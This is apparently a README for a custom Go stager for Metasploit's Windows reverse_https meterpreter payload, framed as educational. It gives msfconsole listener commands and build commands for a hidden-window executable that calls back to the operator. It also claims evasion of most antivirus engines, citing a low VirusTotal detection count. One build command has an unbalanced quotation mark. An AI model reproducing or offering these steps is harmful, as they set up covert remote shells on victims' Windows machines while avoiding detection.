**!!! This is for educational purposes only !!!** <br> **!!! Use this only where authorized !!!**

This is a custom stager written for Metasploit Framework's reverse_https meterpreter payload. I wrote this to get a better understanding of Metasploit Framework's payloads and how well antiviruses detect custom stagers.

# Launching a listener
Using the included `.rc` file launch msfconsole i.e. `msfconsole -f ./listener.rc`

Or run at least the following commands in msfconsole substituting your listening address and port number:
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lport ENTERPORTNUMBERHERE
set lhost ENTERLISTENADDRESSHERE
run
```

# Compiling the payload
The following examples assume you have a shell open in the directory of the msf_rev_https.go file.

These will result in a `.exe` file that will call back to your msfconsole listener.
### Windows
    go build -ldflags "-H=windowsgui -w -s" -o newExecutable.exe . 
### Linux
    env GOOS=windows GOARCH=amd64 go build -ldflags "-s -w -H=windowsgui -o newExecutable.exe .

# Detection
Custom payloads are difficult to detect, at the time of writing this payload was flagged by 3/68 antiviruses on VirusTotal. It is important to note that this is quite low, non-malicious executables are often flagged as well. I have linked below the results from my "newExecutable.exe", and one for putty.exe.

My Go reverse HTTPS meterpreter: https://www.virustotal.com/gui/file/26ac135ef4e7ed030186fc91338989bcbcebfc44c2cb54bc48ace9802097d51b/detection <br>
PuTTY v0.74: https://www.virustotal.com/gui/file/f032c50564a21c39a8c85873a4c96f09eb6398330c67291408497816401957f6/detection